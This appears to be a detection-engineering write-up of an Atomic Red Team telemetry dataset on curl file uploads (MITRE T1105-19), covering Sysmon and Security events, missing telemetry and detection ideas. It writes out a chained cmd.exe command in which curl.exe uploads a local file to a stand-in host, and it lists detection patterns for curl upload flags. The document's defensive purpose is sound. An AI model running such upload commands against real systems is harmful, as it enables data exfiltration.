# T1105-19: Ingress Tool Transfer — Curl Upload File

## Technique Context

T1105 Ingress Tool Transfer encompasses adversary techniques for bringing tools and payloads into compromised environments. While often associated with downloading malicious files, this technique also covers data exfiltration scenarios where attackers upload stolen data to external systems. Curl is particularly attractive to attackers because it's a legitimate, signed binary present by default on modern Windows systems (Windows 10 1803+), making it an ideal "living off the land" tool for both ingress and egress operations.

The detection community focuses heavily on curl's command-line arguments, especially upload-related flags like `-T`, `--upload-file`, `-d`, and `--data`. These flags, combined with external domains or IP addresses, often indicate data exfiltration attempts. Process lineage is also critical — curl spawned from unusual parents (like Office applications, browsers, or scripts) warrants investigation.

## What This Dataset Contains

This dataset captures a PowerShell-initiated execution of four curl upload commands targeting `www.example.com`. The execution chain is:

**Process Chain:**
- PowerShell (PID 9588) → cmd.exe (PID 24088) → Four curl.exe instances

**Command Line Evidence:**
The cmd.exe process executes: `"cmd.exe" /c C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com & C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com`

**Process Creation Events:**
- Sysmon EID 1 captures all four curl process creations with complete command lines
- Security EID 4688 provides parallel process creation telemetry with identical command lines
- Both show the curl processes attempting to upload `c:\temp\atomictestfile.txt` to `www.example.com`

**Exit Status Evidence:**
- Two curl processes exit with code 0x1A (26 decimal), indicating failure
- Two curl processes exit with code 0x0, indicating success
- This mixed success/failure pattern is typical when attempting uploads to unreachable or non-existent endpoints

**File System Activity:**
- Sysmon EID 11 shows PowerShell creating a startup profile file (unrelated to the upload technique)

## What This Dataset Does Not Contain

The dataset lacks several telemetry types that would be present in a real attack scenario:

**Network Telemetry Missing:**
- No Sysmon EID 3 (NetworkConnect) events despite curl attempting external connections
- No DNS query events (Sysmon EID 22) for domain resolution attempts
- This absence likely indicates the target domain `www.example.com` couldn't be resolved or connected to

**File Access Events Missing:**
- No Sysmon EID 2 (FileCreateTime) for accessing `c:\temp\atomictestfile.txt`
- The sysmon-modular configuration may not be monitoring temporary directory access
- No evidence of the source file's existence or access patterns

**PowerShell Script Block Content:**
- PowerShell EID 4104 events contain only test framework boilerplate (`Set-StrictMode`) rather than the actual attack commands
- The curl commands appear to be executed via direct process creation rather than PowerShell cmdlets

## Assessment

This dataset provides excellent process-level telemetry for detecting curl-based upload attempts. Both Sysmon EID 1 and Security EID 4688 capture the complete command lines with upload flags, making this highly valuable for detection engineering. The process tree from PowerShell → cmd → curl represents a common attack pattern that detection rules should identify.

However, the dataset's value is limited by the lack of network telemetry. In real-world scenarios, successful curl uploads would generate network connections, DNS queries, and potentially SSL/TLS certificate validation events. The mixed exit codes (success/failure) suggest the test environment couldn't actually connect to the target, which reduces the dataset's utility for understanding complete attack workflows.

The clean process creation telemetry makes this dataset ideal for developing command-line based detections but insufficient for network-based monitoring rules.

## Detection Opportunities Present in This Data

1. **Curl Upload Command Line Detection** - Monitor for curl.exe processes with upload flags (-T, --upload-file, -d, --data) combined with external domains in command lines

2. **Process Chain Analysis** - Detect unusual parent-child relationships where PowerShell or cmd.exe spawns curl with upload parameters

3. **Multiple Curl Instance Pattern** - Identify rapid successive curl process creations from the same parent, potentially indicating batch upload operations

4. **Living Off The Land Binary (LOLBin) Usage** - Alert on curl.exe usage from scripting contexts (PowerShell, cmd) with external network destinations

5. **Command Line Obfuscation Bypass** - The chained commands using `&` operators provide detection opportunities for command concatenation patterns

6. **File Path Analysis** - Monitor curl processes referencing temporary directories (c:\temp\) or other staging locations commonly used in attack scenarios

7. **Exit Code Correlation** - Correlate curl process exit codes with command line arguments to identify failed vs. successful exfiltration attempts

8. **PowerShell Execution Policy Changes** - The PowerShell EID 4103 shows execution policy bypass, which often precedes malicious script execution
